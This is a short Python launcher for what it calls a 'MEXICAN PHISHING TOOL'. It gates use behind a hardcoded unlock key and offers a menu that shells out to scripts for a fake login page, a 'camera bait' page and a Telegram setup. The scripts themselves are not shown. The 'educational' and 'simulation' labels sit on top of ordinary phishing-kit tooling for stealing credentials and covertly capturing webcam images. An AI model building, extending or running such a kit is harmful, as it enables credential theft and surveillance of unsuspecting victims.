
import os
import sys
from utils import protection

print("\n🔥 MEXICAN PHISHING TOOL\n⚠️ For Educational Use Only\n👑 Created by D TWINZ\n")

unlock_key = input("🔑 Enter Unlock Key: ")
if unlock_key != "mexican2025":
    print("❌ Invalid Key! Exiting...")
    sys.exit()

protection.run_protection()

print("""
[1] Fake Login Page (Simulation)
[2] Camera Bait Page (Simulation)
[3] Telegram Setup (Optional)
[0] Exit
""")

choice = input("Select an option: ")
if choice == "1":
    os.system("bash data/login_simulator.sh")
elif choice == "2":
    os.system("bash data/camphish_simulator.sh")
elif choice == "3":
    os.system("python3 telegram/setup.py")
else:
    print("👋 Exiting... Stay safe!")
